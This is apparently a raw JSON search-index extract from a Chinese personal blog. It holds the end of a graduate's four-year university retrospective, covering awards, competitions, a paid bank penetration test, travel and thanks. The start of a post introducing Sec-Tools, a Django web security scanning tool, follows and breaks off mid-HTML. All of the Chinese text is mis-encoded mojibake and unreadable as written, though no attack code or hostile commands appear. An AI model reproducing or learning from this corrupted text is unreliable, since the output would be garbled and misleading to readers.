è¿™ä¸€å¹´å°è±¡æœ€æ·±çš„å°±æ˜¯çªå¦‚èµ·æ¥çš„ç–«æƒ…äº†ï¼Œæ‰“ç ´äº†åŸæœ¬å¹³é™çš„ç”Ÿæ´»ï¼Œæ•´ä¸ªä¸‹å­¦æœŸæˆ‘éƒ½åœ¨å®¶ä¸Šç½‘è¯¾ã€‚è¿™ä¸€å¹´çš„ä¸»æ—‹å¾‹æ˜¯å­¦ä¹ ï¼Œæ¯”èµ›ï¼Œå„ç§ç©ã€‚è¿™ä¸€å¹´å¯¹æˆ‘æ¥è¯´æå‡å¾ˆå¿«ï¼Œä¸€æ–¹é¢æ˜¯å‚åŠ äº†å¾ˆå¤šæ¯”èµ›ï¼Œé•¿äº†ä¸å°‘è§è¯†ï¼Œè®¤è¯†äº†å¾ˆå¤šå¤§ä½¬ï¼›å¦ä¸€æ–¹é¢æ˜¯å› ä¸ºç–«æƒ…è®©æˆ‘æ²‰é™ä¸‹æ¥ï¼Œå­¦åˆ°äº†å¾ˆå¤šæ–°çŸ¥è¯†ã€‚ä¹Ÿæ˜¯è¿™ä¸€å¹´ï¼Œæˆ‘æ²‰ä¸‹å¿ƒæ¥å­¦ä¹ äº†ä¸€ä¸ªæœˆè‹±è¯­ï¼Œä¹Ÿè®©æˆ‘çƒ‚é€äº†çš„è‹±è¯­æ°´å¹³æœ‰äº†ä¸å°‘çš„æå‡ã€‚\n\n### æ·±å…¥å­¦ä¹ \n\nä¸Šå­¦æœŸçš„è¯¾ç¨‹ç›¸å¯¹æ¥è¯´éƒ½æ¯”è¾ƒéš¾ï¼Œæ•°æ®ç»“æ„ã€æ±‡ç¼–ã€å®‰å…¨ç¼–ç¨‹æŠ€æœ¯...ï¼Œéƒ½ä»¤æˆ‘å¤´å¤§ï¼ŒèŠ±è´¹çš„æ—¶é—´å’Œå¿ƒæ€ä¹Ÿæ›´å¤šä¸€äº›ã€‚ä¸‹å­¦æœŸåœ¨å®¶ä¸Šç½‘è¯¾ï¼Œå¥½å‡ é—¨è¯¾è®²çš„çŸ¥è¯†æˆ‘éƒ½ä¼šï¼Œæ‰€ä»¥è¿™äº›è¯¾æˆ‘éƒ½æ˜¯èƒ½æ°´å°±æ°´ï¼Œç½‘è¯¾æ”¾ç€ç„¶åæè‡ªå·±çš„ä¸œè¥¿ï¼ˆç³»ç»Ÿå­¦äº†ä¸‹å‰ç«¯ã€Djangoã€æ¸—é€ï¼‰ï¼Œè¿™ä¸€å­¦æœŸä¹Ÿè®©æˆ‘æ„Ÿè§‰æå‡äº†å¾ˆå¤šï¼Œåœ¨å®¶é™ä¸‹æ¥å­¦åˆ°äº†å¾ˆå¤šçŸ¥è¯†ã€‚è¿™ä¸€å¹´æˆ‘çš„ç»¼åˆæˆç»©æ’åä»ç„¶æ˜¯ä¸“ä¸šç¬¬ä¸€ï¼Œè·å¾—äº†ä¸¤æ¬¡ä¸€ç­‰å¥–å­¦é‡‘ï¼Œå›½å®¶åŠ±å¿—å¥–å­¦é‡‘ï¼ˆå›½å¥–æˆ‘ä»¬è¾…å¯¼å‘˜å¸¦çš„ä¸¤ä¸ªä¸“ä¸šåªæœ‰ä¸€ä¸ªåé¢ï¼Œæ²¡æœ‰ç«äº‰è¿‡å¦å¤–ä¸€ä¸ªä¸“ä¸šçš„åŒå­¦ğŸ˜­ï¼Œç—›å¤±å›½å¥–ï¼‰ã€‚\n\n### å„ç§æ¯”èµ›\n\nä¸Šå­¦æœŸå‚åŠ äº†å­¦æ ¡ä¸¾åŠçš„è¥¿ååˆ›æƒ³æ¯è·å¾—äºŒç­‰å¥–ï¼Œé€šè¿‡çœå›¢å§”å’Œå››å·å­¦è”çš„è®¤è¯è·å¾—äº†å››å·çœå¤§å­¦ç”Ÿâ€œç»¼åˆç´ è´¨Açº§è¯ä¹¦â€ï¼ˆéœ€è¦æ»¡è¶³7ä¸ªç±»åˆ«å…±21ä¸ªé¡¹ç›®ï¼Œç´¯è®¡æ€»åˆ†è¾¾åˆ°28åˆ†å³å¯è®¤è¯ï¼Œæ„Ÿè§‰è¿˜æ˜¯æœ‰ä¸€å®šéš¾åº¦çš„ï¼Œæˆ‘å¤§ä¸‰æ‰æ»¡è¶³æ¡ä»¶ğŸ˜Ÿï¼‰\n\nä¸‹å­¦æœŸå› ä¸ºç–«æƒ…çˆ†å‘ï¼Œå¾ˆå¤šæ¯”èµ›éƒ½æ¨è¿Ÿæˆ–è€…æ”¹ä¸ºçº¿ä¸Šä¸¾è¡Œäº†ï¼Œå‚åŠ äº†å››å·çœè®¡ç®—æœºä½œå“èµ›è·å¾—äº†äºŒç­‰å¥–ï¼›å‚åŠ ä¸­å›½å¤§å­¦ç”Ÿè®¡ç®—æœºè®¾è®¡å¤§èµ›è·å¾—çœçº§èµ›äºŒç­‰å¥–å¹¶è¢«æ¨è¿›å›½èµ›ï¼Œè·å¾—å›½èµ›ä¸‰ç­‰å¥–ï¼›å‚åŠ å…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨å¯¹æŠ—æŠ€æœ¯ç«èµ›è·å¾—äºŒç­‰å¥–ã€‚\n\n### å‡æœŸä¹è¶£\n\nä¸Šå­¦æœŸå’Œæœ‹å‹å»äº†ä¹å±±ç©ï¼Œçœ‹äº†ä¹å±±å¤§ä½›ï¼Œåƒäº†å„ç§å°åƒï¼Œè‡³ä»Šä»å›å‘³çš„æ˜¯ä¹å±±æ²¹ç‚¸ä¸²ä¸²å’Œä¸‰é²œå†°ç²‰ï¼Œä¾¿å®œåˆå¥½åƒã€‚è¿‡å¹´å‰å¤•ï¼ˆç–«æƒ…çˆ†å‘ä¹‹å‰ï¼‰ï¼Œæˆ‘å»äº†å‡‰å±±å·æ¸¸ç© ï¼Œé€”å¾„é›…å®‰ï¼Œåˆ°è¾¾è¥¿æ˜Œçš„é‚›æµ·å’Œåºå±±ï¼Œä¸€è·¯å‘å‰å»äº†æ³¸æ²½æ¹–ï¼Œæ³¸æ²½æ¹–çš„æ°´å’Œå¤©ç©ºçœŸçš„æ˜¯æ ¼å¤–çº¯å‡€ï¼Œè¿™é‡Œè¿˜æ²¡é‚£ä¹ˆå•†ä¸šåŒ–ï¼Œå¾ˆå€¼å¾—å»çœ‹çœ‹ã€‚æš‘å‡ï¼ˆç–«æƒ…æ§åˆ¶å¾—å¾ˆå¥½äº†ï¼‰å»äº†å®¤å‹å®¶å¤§è¿ç©ï¼Œç¬¬ä¸€æ¬¡å»ä¸œåŒ—ï¼Œç¬¬ä¸€æ¬¡çœ‹äº†æµ·ï¼Œç¬¬ä¸€æ¬¡çœ‹äº†æµ·è±šè¡¨æ¼”ï¼Œè¿™ä¸€è¶Ÿå·®ä¸å¤šæŠŠå¤§è¿ç©äº†ä¸ªéï¼ˆæ£’æ£°å²›ï¼Œåœ£äºšæµ·æ´‹å…¬å›­ï¼Œæ˜Ÿæµ·å…¬å›­ï¼Œå¨å°¼æ–¯æ°´åŸï¼Œæ—¥ä¿„ç›‘ç‹±ï¼Œæ—…é¡º......ï¼‰ï¼Œç¾å¥½çš„æ—¶å…‰å¯æ€»æ˜¯é‚£ä¹ˆçŸ­æš‚ï¼\n\n## â‘£å¤§å››\n\næ—¶é—´ï¼š2020.08-2021.07\n\n### ä¿ç ”æˆåŠŸ\n\nè¿™ä¸€å¹´ç»å†äº†å¾ˆå¤šï¼Œé¦–å…ˆæ˜¯å› ä¸ºå‰ä¸‰å¹´æˆç»©ä¸€ç›´æ’åç¬¬ä¸€å’Œå„ç§æ¯”èµ›è·å¥–çš„åŠ æˆé¡ºåˆ©è·å¾—äº†ä¿ç ”èµ„æ ¼ï¼Œé€šè¿‡é¢„æ¨å…æˆåŠŸæ‹¿åˆ°ç”µå­ç§‘æŠ€å¤§å­¦çš„offerï¼Œéœ€è¦ä¿ç ”ç»éªŒçš„å¯ä»¥çœ‹æˆ‘å¦ä¸€ç¯‡æ–‡ç« [ä¿ç ”ç”µå­ç§‘å¤§ç»éªŒåˆ†äº«](https://jwt1399.top/posts/39301.html)ã€‚ä¿ç ”æˆåŠŸåï¼Œæˆ‘å¼€å§‹æ…¢æ…¢åšæ¯•è®¾äº†ï¼Œé€‰å®šäº†Webå®‰å…¨å·¥å…·å¼€å‘çš„é¢˜ç›®ï¼Œç–«æƒ…æœŸé—´å­¦ä¹ çš„ Django æ´¾ä¸Šäº†ç”¨åœºï¼Œæœ€ç»ˆæ–­æ–­ç»­ç»­çš„å®Œæˆäº†é¡¹ç›®çš„å¼€å‘å’Œè®ºæ–‡çš„æ’°å†™ã€‚éœ€è¦å‚è€ƒæˆ‘çš„æ¯•è®¾å¯ä»¥çœ‹æˆ‘å¦ä¸€ç¯‡æ–‡ç« [Webå®‰å…¨å·¥å…·å¼€å‘](https://jwt1399.top/posts/12663.html)ï¼Œè¿™ä¸ªé¡¹ç›®ä¹Ÿåœ¨æˆ‘çš„ [GitHub](https://github.com/jwt1399/Sec-Tools)ä¸Šå¼€æºäº†ï¼Œæ±‚ Star ï¼é€šè¿‡ç­”è¾©æˆ‘çš„è®ºæ–‡è·å¾—äº†ä¼˜ç§€è®ºæ–‡ï¼Œå¹¶ä¸”æˆ‘è¿˜è·å¾—äº†å››å·çœä¼˜ç§€æ¯•ä¸šç”Ÿçš„è£èª‰ç§°å·ã€‚\n\n### å¤–å‡ºé¡¹ç›®\n\nå› ä¸ºæˆåŠŸä¿ç ”ï¼Œè¿™ä¸€å¹´æˆ‘çš„ä»»åŠ¡å°±åªæœ‰åšæ¯•è®¾ï¼Œè¿™ä¾¿è®©æˆ‘æœ‰äº†æ—¶é—´å¤–å‡ºåšä¸€äº›é¡¹ç›®ï¼Œä¸Šå­¦æœŸæˆ‘å»äº†å®œå®¾XXé“¶è¡Œå¯¹ä»–ä»¬çš„åå°ç³»ç»Ÿè¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œå‘†äº†9å¤©äº†ï¼Œèµšå–äº†ä¸€ç¬”ä¸è²çš„ä½£é‡‘ã€‚ä¸‹å­¦æœŸå»ä¸Šæµ·æŸé‡‘èä¼ä¸šæ€»éƒ¨å‚åŠ  HW è¡ŒåŠ¨ï¼Œåœ¨ä¸Šæµ·å‘†äº†è¿‘20å¤©ï¼Œåˆè®©æˆ‘èµšäº†ä¸€ç¬”ä¸é”™çš„æ”¶å…¥ã€‚è¿™æ ·å¤–å‡ºçš„ä¸€äº›é¡¹ç›®è¿˜æ˜¯å¾ˆæœ‰æ„ä¹‰çš„ï¼Œä¸ä»…èƒ½èµšåˆ°å¾ˆå¤šMoneyï¼Œè¿˜èƒ½å­¦åˆ°çŸ¥è¯†ã€è®¤è¯†æœ‹å‹ã€å¼€é˜”çœ¼ç•Œï¼Œæœªæ¥å¸Œæœ›è‡ªå·±å¤šå‡ºå»æ¥æ¥é¡¹ç›®ï¼Œè€Œä¸æ˜¯ä¸€å‘³æ­»è¯»ä¹¦ã€‚\n\n### èµ°èµ°åœåœ\n\nä¸Šå­¦æœŸå‡æœŸå»äº†é˜†ä¸­å¤åŸï¼ˆä¸æ¨èå»ï¼Œå¤åŸé‡Œé¢æ²¡ä»€ä¹ˆå¥½ç©çš„ï¼Œä¸»è¦è¢«å¼ é£ç‰›è‚‰å’Œé†‹æ³¡è„šå é¢†ï¼‰å’Œå‰‘é—¨å…³ï¼ˆå‰‘é—¨å…³è¿˜æ˜¯å€¼å¾—ä¸€å»çš„ï¼Œæœ‰ä¸ªå¤©èµæ¸©æ³‰è¿˜ä¸é”™ï¼Œå‰‘é—¨å…³æ™¯åŒºé‡Œä¹Ÿè¿˜è¡Œï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰å®Œå…¨èµ°å®Œï¼Œå®åœ¨å¤ªç´¯äº†ï¼‰ï¼Œä¸‹å­¦æœŸå› ä¸ºå·¥ä½œå»ä¸Šæµ·ï¼Œå»äº†å¤–æ»©é€›äº†é€›ï¼Œå—äº¬ä¸œè·¯åƒäº†ä¸Šæµ·æœ¬å¸®èœï¼Œä¸ªäººæ„Ÿè§‰å¤ªæ¸…æ·¡ï¼Œä¸å¤ªç¬¦åˆæˆ‘çš„å£å‘³ï¼Œä¸ªåˆ«èœè¿˜æ˜¯æŒºå¥½åƒçš„ï¼Œåœ¨é™•è¥¿å—è·¯åƒäº†ä¸€å®¶æœ‰åçš„é¢ï¼Œåº—é“ºå¾ˆå°ï¼Œä½†æ˜¯æ’é˜Ÿçš„äººå¾ˆå¤šï¼Œä¸€ç¢—é¢å·®ä¸å¤šéƒ½æ˜¯50ä»¥ä¸Šï¼Œä½†å…¶å®å‘³é“ä¸€èˆ¬å§ï¼Œå¯èƒ½æ˜¯ä¸Šæµ·çš„å£å‘³çœŸçš„ä¸å¤ªé€‚åˆæˆ‘ã€‚æœ¬æ¥æ‰“ç®—å»è¿ªå£«å°¼çš„ï¼Œç”±äºå› ä¸ºæ—¶é—´å†²çªæ²¡æœ‰å»åˆ°é‡Œé¢ç©ï¼Œä½†æ˜¯é€›äº†è¿ªå£«å°¼çš„å•†åº—ï¼ˆå•†åº—çš„ç©å¶å’Œå„æ ·çš„ä¸œè¥¿éƒ½æŒºå¥½çœ‹çš„ï¼Œä½†ä¹Ÿæ˜¯çœŸçš„è´µï¼‰ï¼Œæ™šä¸Šè¿˜è¹­äº†è¿ªå£«å°¼çš„çƒŸèŠ±ï¼Œä»¥åæœ‰æœºä¼šå†å»è¿›åˆ°é‡Œé¢å»ç©å§ï¼Œä»ä¸Šæµ·å›æ¥åç›´æ¥é£åˆ°äº†é‡åº†ï¼Œè™½ç„¶å¤§äºŒå»é‡é‚®æ¯”èµ›çš„æ—¶å€™å»è¿‡ï¼Œä½†å½“æ—¶å¹¶æ²¡æœ‰ä»”ç»†çš„ç©ï¼Œè¿™æ¬¡å»é‡åº†ï¼Œå·®ä¸å¤šæŠŠé‡åº†ç©äº†ä¸ªéï¼Œæ´ªå´–æ´ã€è§£æ”¾ç¢‘ã€æœå¤©é—¨ç å¤´ã€æå­åè½»è½¨ç«™ã€é¹…å²­äºŒå‚â€¦â€¦ä¸è¿‡ä»¤æˆ‘å°è±¡æœ€æ·±çš„è¿˜æ˜¯é‡åº†çš„å…«ä¸€å¥½åƒè¡—ï¼Œé‡Œé¢çš„å°åƒéƒ½å¾ˆä¸é”™ï¼Œå°¤å…¶æ˜¯æ°´æœå†°æ±¤åœ†(åœ°ç‚¹åœ¨å…«ä¸€å¥½åƒè¡—çš„å…¥å£å¤„ï¼Œ15å…ƒä¸€ç¢—ï¼Œæˆ‘ä¸€å¤©åƒäº†3ç¢—)ï¼Œç®€ç›´ç»äº†ï¼Œè‡³ä»Šè¿˜æ²¡æœ‰åœ¨æˆéƒ½æ‰¾åˆ°æ›¿ä»£å“ï¼Œæˆ‘æƒ³æœªæ¥æˆ‘è¿˜ä¼šå»å¾ˆå¤šæ¬¡é‡åº†çš„å§ã€‚\n\n## â‘¤æ€»ç»“\n\nè¯´èµ·æ¥é—æ†¾å…¶å®æŒºå¤šçš„ï¼Œä¸“ä¸šçŸ¥è¯†æ²¡æœ‰å­¦å¾—ç‰¹åˆ«å¥½ã€ç¼–ç¨‹æ°´å¹³ä¹Ÿå¾ˆæ˜¯ä¸€è¨€éš¾å°½ã€è‹±è¯­æ°´å¹³ä¹Ÿæ²¡æœ‰å¾ˆå¤§çš„æå‡ï¼Œå£è¯­æ°´å¹³æ›´æ˜¯ä¸€å¡Œç³Šæ¶‚ã€æ²¡æœ‰å»å¾ˆå¤šå¾ˆå¤šçš„åŸå¸‚èµ°èµ°çœ‹çœ‹ã€æ²¡æœ‰æ­£ç»å»å…¬å¸å‚åŠ è¿‡å®ä¹ ã€æ²¡æœ‰åœ¨å¤§å­¦å­˜å¾ˆå¤šå¾ˆå¤šé’±ã€è‡ªå·±æ²¡æœ‰å˜å¾—é‚£ä¹ˆé‚£ä¹ˆä¼˜ç§€ã€‚ã€‚ã€‚\n\nè‡³äºå±•æœ›ï¼Œå¸Œæœ›åœ¨æˆç”µçš„ä¸‰å¹´ç ”ç©¶ç”Ÿç”Ÿæ¶¯èƒ½æ”¶è·æ»¡æ»¡ï¼Œå­¦åˆ°å¾ˆå¤šå®ç”¨çŸ¥è¯†ï¼Œå¤šæ‹¿ä¸€äº›å¥–å­¦é‡‘ï¼Œå¤šæ¥ä¸€äº›é¡¹ç›®å¤šèµšä¸€ç‚¹é’±ï¼Œå®ç°å­¦è´¹å’Œç”Ÿæ´»è´¹è‡ªç”±ï¼Œå‘ä¸€äº›ä¼˜è´¨æ–‡ç« ï¼Œè®¤è¯†ä¸€äº›å¿—è¶£ç›¸æŠ•çš„æœ‹å‹ã€‚å¦å¤–å¸Œæœ›è‹±è¯­æ°´å¹³èƒ½å¤Ÿæå‡ä¸€ç‚¹ã€‚æ¯•ä¸šåå¸Œæœ›æ‰¾åˆ°ä¸€ä»½ä¸é”™çš„å·¥ä½œï¼ˆå¸Œæœ›è–ªèµ„è¾¾åˆ°30w~50wï¼‰ï¼Œ30å²ä¹‹å‰å¸Œæœ›åœ¨æˆéƒ½æ‹¥æœ‰ä¸€å¥—å±äºè‡ªå·±çš„æˆ¿å­ã€‚\n\nè¿™å››å¹´ç»å†äº†å¤ªå¤šå¤ªå¤šï¼Œä¹Ÿè®¸è¿™æ˜¯æˆ‘äººç”Ÿä¸­æœ€æœ‰æ„ä¹‰çš„å››å¹´å§ï¼Œè¿˜æœ‰å¥½å¤šå¥½å¤šå†…å®¹æ²¡æœ‰å†™å‘¢ï¼Œæœ‰äº›ä¸çŸ¥é“å¦‚ä½•å†™ï¼Œæœ‰äº›ä¸æƒ³å†™ï¼Œæœ‰äº›æˆ‘è®°ä¸å¤ªæ¸…äº†ï¼Œç­‰æˆ‘æƒ³å¥½äº†æˆ‘å†æ…¢æ…¢å†™å§ï¼Œæš‚æ—¶å°±å†™è¿™ä¹ˆå¤šï¼Œæˆ‘çš„é’æ˜¥ä¼¼ä¹å°±è¿™ä¹ˆç»“æŸäº†ğŸ˜¶\n\n## â‘¥è‡´è°¢\n\næ¡ƒæä¸è¨€ï¼Œä¸‹è‡ªæˆè¹Šã€‚é¦–å…ˆæ„Ÿè°¢æ‰€æœ‰æ•™å¯¼è¿‡æˆ‘çš„è€å¸ˆä»¬ï¼Œå…¶æ¬¡æˆ‘è¦æ„Ÿè°¢æˆ‘çš„æ¯•è®¾æŒ‡å¯¼è€å¸ˆã€‚åœ¨æ¯•è®¾è®ºæ–‡çš„æ’°å†™è¿‡ç¨‹ä¸­,å¾—å¹¸é‡æ›¾è€å¸ˆï¼Œä»é€‰é¢˜åˆ°ç³»ç»Ÿè®¾è®¡å†åˆ°è®ºæ–‡ç¼–å†™ï¼Œæ¯ä¸€éƒ¨åˆ†éƒ½ç¦»ä¸å¼€æ›¾è€å¸ˆçš„æŒ‡å¯¼å’Œå¸®åŠ©ã€‚é¥®å…¶æµæ—¶æ€å…¶æºï¼Œæˆå¾å­¦æ—¶å¿µå¾å¸ˆã€‚åœ¨æ­¤è¡·å¿ƒçš„æ„Ÿè°¢æˆ‘çš„æŒ‡å¯¼è€å¸ˆä»¥åŠæ‰€æœ‰æ•™å¯¼è¿‡æˆ‘çš„è€å¸ˆä»¬ã€‚è¡·å¿ƒç¥æ„¿å„ä½è€å¸ˆå·¥ä½œé¡ºåˆ©ï¼Œå¹³å®‰å–œä¹ã€‚\n\nç»“è‰è¡”ç¯ï¼Œé¥®æ°´æ€æºã€‚å…¶æ¬¡æ„Ÿè°¢æˆ‘çš„å®¶äººäºŒåä½™è½½çš„æ‚‰å¿ƒåŸ¹å…»å’Œæ•™è‚²ï¼Œæ„Ÿè°¢ä»–ä»¬åœ¨æˆ‘æ±‚å­¦ä¹‹è·¯ä¸Šçš„æ— ç§æ”¯æŒä¸é»˜é»˜ä»˜å‡ºã€‚åœ¨æˆ‘é‡åˆ°å›°æƒ‘æ—¶æŒ‡ç‚¹æ–¹å‘ï¼Œçƒ¦æ¼æ—¶è€å¿ƒå¼€å¯¼ï¼Œåšæˆ‘æœ€åšå¼ºçš„åç›¾ã€‚ç¥æ„¿æˆ‘çš„å®¶äººèº«ä½“å¥åº·ï¼Œå¤©å¤©å¼€å¿ƒã€‚\n\nå±±æ°´ä¸€ç¨‹ï¼Œä¸‰ç”Ÿæœ‰å¹¸ã€‚æ„Ÿè°¢ä¿¡æ¯å®‰å…¨äºŒç­å¯çˆ±çš„åŒå­¦ä»¬ï¼Œæ„Ÿè°¢ä½ ä»¬ç»™äºˆæˆ‘å·¥ä½œä¸Šçš„å¸®åŠ©ä¸æ”¯æŒï¼ŒäºŒåå››ä½åŒå­¦ä»å¤©å—åœ°åŒ—å› ä¸ºç¼˜åˆ†ç›¸èšäºæ­¤ï¼Œä¸€èµ·åº¦è¿‡äº†æœ¬ç§‘ç¾å¥½çš„å››å¹´ï¼Œæ„¿æ¯•ä¸šåæˆ‘ä»¬åœ¨å½¼æ­¤çœ‹ä¸åˆ°çš„åœ°æ–¹ç† ç† ç”Ÿè¾‰ã€‚\n\næœ‰ç¼˜ç›¸è¯†ï¼Œæœ‰å¹¸ç›¸çŸ¥ã€‚æ„Ÿè°¢å®éªŒå®¤çºªè€å¸ˆåœ¨å­¦ä¹ ä¸Šç»™äºˆé¼“èˆä¸å‹‰åŠ±ï¼Œåœ¨ç”Ÿæ´»ä¸Šç»™äºˆå¸®åŠ©ä¸å¼€å¯¼ã€‚æ„Ÿè°¢èµ›åœºä¸Šä¸€èµ·å¹¶è‚©ä½œæˆ˜ï¼Œèµ›åœºä¸‹ä¸€èµ·äº¤æµå­¦ä¹ çš„å®éªŒå®¤çš„å°ä¼™ä¼´ä»¬ï¼Œæ„¿ä½ ä»¬æœ‰å‰ç¨‹å¯å¥”èµ´ï¼Œäº¦æœ‰å²æœˆå…±å›é¦–ã€‚\n\nå¾€æ—¥ä¸æ‚”ï¼Œæ¥æ—¥å¯æœŸã€‚æœ€åæˆ‘è¦æ„Ÿè°¢æˆ‘çš„å¥³æœ‹å‹åºå°å§ï¼Œå…œå…œè½¬è½¬ï¼Œæœªæ›¾ç¦»å¼€ï¼ŒçŸ¥æˆ‘å†·æš–ï¼Œæ‡‚æˆ‘æ‚²æ¬¢ï¼Œæ„Ÿè°¢è®©æˆ‘åœ¨æœ€å¥½çš„å¹´çºªé‡è§ä½ ï¼Œå…­å¹´å²æœˆï¼Œæ— éœ€æƒŠè‰³æ—¶å…‰ï¼Œå”¯æ„¿ä¸è´Ÿå½¼æ­¤ã€‚\n","tags":["æ€»ç»“"],"categories":["Share"]},{"title":"Webå®‰å…¨å·¥å…·å¼€å‘","url":"/posts/12663.html","content":"\n<h1 align=\"center\" >ğŸ‰Sec-Tools</h1>\n<p align=\"center\">æœ¬é¡¹ç›®å·²å¼€æºï¼šå­¦ä¹ çš„åŒæ—¶ï¼Œç»™ä¸ª Star å§ ï¼ï¼ï¼</p>\n\n| GitHub | https://github.com/jwt1399/Sec-Tools |\n| ------ | ------------------------------------ |\n| Gitee  | https://gitee.com/jwt1399/Sec-Tools  |\n\n## å‰è¨€\n\n![welcome](https://img.jwt1399.top//img/20210617152728.png)\n\né¡¹ç›®ä»12æœˆåº•è‡³ä»Šï¼ŒæœŸé—´å› å„ç§åŸå› æ–­æ–­ç»­ç»­çš„å¼€å‘ï¼Œå‰å‰ååå·²ç»å‘å¸ƒäº†5ä¸ªç‰ˆæœ¬ï¼Œä»æœ€åˆåªæœ‰æ¡†æ¶çš„ `V1.0` ç‰ˆæœ¬ï¼Œåˆ°å¦‚ä»ŠåŠŸèƒ½æ—¥è¶‹å®Œå–„çš„ `V2.3` ç‰ˆæœ¬é¡¹ç›®æ­£åœ¨ä¸æ–­å®Œå–„ä¸­ï¼Œç°å·²é›†æˆ`ç«¯å£æ‰«æ`ã€`æŒ‡çº¹è¯†åˆ«`ã€`æ—ç«™æ¢æµ‹`ã€`ä¿¡æ¯æ³„éœ²æ‰«æ`ã€`å®‰å…¨å¯¼èˆª`ç­‰å¤šä¸ªåŠŸèƒ½ï¼Œåç»­å°†åŠ å…¥`æ¼æ´æ£€æµ‹`ã€`ç›®å½•è¯†åˆ«`ã€`åŸŸåæ¢æµ‹`ç­‰åŠŸèƒ½ï¼Œä¸€èµ·æœŸå¾…å§ï¼é¡µé¢æˆ‘ä»¬å°½å¯èƒ½åšåˆ°ç®€å•ã€æ¸…æ–°ï¼Œä¾¿äºç”¨æˆ·ä½¿ç”¨ã€‚ç° `UI` å·²ç»é€‚é…`PCç«¯`ã€`Phoneç«¯`ã€`Padç«¯`ï¼Œä½¿ç”¨æˆ·å¾—åˆ°èˆ’é€‚çš„ä½¿ç”¨ä½“éªŒã€‚æˆ‘ä»¬è‡´åŠ›äºæ‰“é€ ä¸€æ¬¾å®‰å…¨é«˜æ•ˆã€æ“ä½œç®€å•ã€ç•Œé¢æ¸…çˆ½ã€å…¼å®¹é€‚é…çš„å®‰å…¨å·¥å…·ã€‚æœ¬é¡¹ç›®çš„çµæ„Ÿæ¥è‡ªäºå›½å…‰å¸ˆå‚…çš„æ–‡ç« [Django ç¼–å†™ Web æ¼æ´æ‰«æå™¨æŒ–å‘è®°å½•](https://www.sqlsec.com/2020/05/webscan.html)ã€‚å°±åƒå›½å…‰å¸ˆå‚…è¯´çš„é‚£æ ·æˆ‘ä»¬æ— è®ºæ˜¯å¼€å‘è¿˜æ˜¯å®‰å…¨éƒ½æœ‰å¾ˆé•¿çš„è·¯è¦èµ°ï¼Œè·¯æ¼«æ¼«å…¶ä¿®è¿œå…®ï¼Œå¾å°†ä¸Šä¸‹è€Œæ±‚ç´¢ï¼\n\n2021.03.02æ›´æ–°ï¼šç‰ˆæœ¬æ›´æ–°åˆ° `V2.5` ,æ–°å¢äº†`æ¼æ´æ‰«æ`ã€`ç›®å½•æ‰«æ`ç­‰åŠŸèƒ½å¹¶ä¸”è¿›è¡Œäº†ä¸€ç³»åˆ— `UI` ä¼˜åŒ–ã€‚\n\n2021.04.20æ›´æ–°ï¼šç‰ˆæœ¬æ›´æ–°åˆ°`V2.7`,æ–°å¢äº†`æ¼æ‰«è¯¦æƒ…é¡µ`ã€`ä»ªè¡¨ç›˜`ã€`åŸŸåæ¢æµ‹`ç­‰åŠŸèƒ½å¹¶ä¸”è¿›è¡Œäº†ä¸€ç³»åˆ—ä¼˜åŒ–å’ŒBugä¿®å¤ã€‚\n\n## é¡¹ç›®ä»‹ç»\n\n### ç³»ç»Ÿç®€ä»‹\n\næœ¬é¡¹ç›®å‘½åä¸º**Sec-Tools**ï¼Œæ˜¯ä¸€æ¬¾åŸºäº Python-Django çš„åœ¨çº¿å¤šåŠŸèƒ½ Web åº”ç”¨æ¸—é€æµ‹è¯•ç³»ç»Ÿï¼ŒåŒ…å«æ¼æ´æ£€æµ‹ã€ç›®å½•è¯†åˆ«ã€ç«¯å£æ‰«æã€æŒ‡çº¹è¯†åˆ«ã€åŸŸåæ¢æµ‹ã€æ—ç«™æ¢æµ‹ã€ä¿¡æ¯æ³„éœ²æ£€æµ‹ç­‰åŠŸèƒ½ã€‚æœ¬ç³»ç»Ÿé€šè¿‡`æ—ç«™æ¢æµ‹`å’Œ`åŸŸåæ¢æµ‹`åŠŸèƒ½å¯¹å¾…æ£€æµ‹ç½‘ç«™è¿›è¡Œèµ„äº§æ”¶é›†ï¼Œé€šè¿‡`ç«¯å£æ‰«æ`ã€`æŒ‡çº¹è¯†åˆ«`ã€`ç›®å½•è¯†åˆ«`å’Œ`ä¿¡æ¯æ³„éœ²æ£€æµ‹`åŠŸèƒ½å¯¹å¾…æ£€æµ‹ç½‘ç«™è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œé€šè¿‡æ”¶é›†çš„ä¿¡æ¯åˆ†æè¯„ä¼°ç½‘ç«™å­˜åœ¨å“ªäº›å®‰å…¨éšæ‚£ï¼Œç„¶åä½¿ç”¨`æ¼æ´æ£€æµ‹`åŠŸèƒ½æ­ç¤ºç½‘ç«™å­˜åœ¨çš„æ¼æ´ä»¥åŠå±å®³ç­‰çº§å¹¶ç»™å‡ºä¿®å¤å»ºè®®ã€‚é€šè¿‡è¿™ä¸€ç³»åˆ—çš„æ­¥éª¤ï¼Œå¯ä»¥å¯¹Webåº”ç”¨è¿›è¡Œå…¨é¢æ£€æµ‹ï¼Œä»è€Œå‘ç°ç½‘ç«™å­˜åœ¨çš„å®‰å…¨éšæ‚£ï¼Œå› æ­¤ç”¨æˆ·å¯ä»¥é’ˆå¯¹ç›¸åº”çš„ç½‘ç»œå¨èƒåšå‡ºåº”æ€¥å“åº”ï¼Œè¿›è€Œæå‡ç«™ç‚¹çš„å®‰å…¨æ€§ã€‚\n\n### **å›¢é˜Ÿæˆå‘˜**\n\næœ¬é¡¹ç›®ç”±æˆ‘æ‹…ä»»ç»„é•¿ï¼Œå¸¦é¢†å…¶ä½™3äººå…±åŒå¼€å‘ï¼Œå› æ­¤ä»£ç é£æ ¼ä¼šæœ‰ä¸åŒï¼Œç›¸å…³åŠŸèƒ½çš„å®ç°æ·±åº¦ä¹Ÿä¼šå‚å·®ä¸é½ !\n\n <table style=\"padding-left:150px\">\n   <tbody>\n      <tr>\n          <td style=\"text-align:center;\">\n              <a href=\"https://jwt1399.top\">ç®€åŒå­¦</a>\n          </td>\n          <td style=\"text-align:center;\">\n              <a href=\"https://www.jianshu.com/u/27d54629447c\">é‚“åŒå­¦</a>\n          </td>\n\t\t  <td style=\"text-align:center;\">\n              <a href=\"https://blog.xiafeng2333.top/\">ç‹åŒå­¦</a>\n          </td>\n\t\t  <td style=\"text-align:center;\">\n              <a>æ—åŒå­¦</a>\n          </td>\n      </tr>\n    <tr>\n\t\t<td style=\"text-align:center;\" > <img width=\"200\" 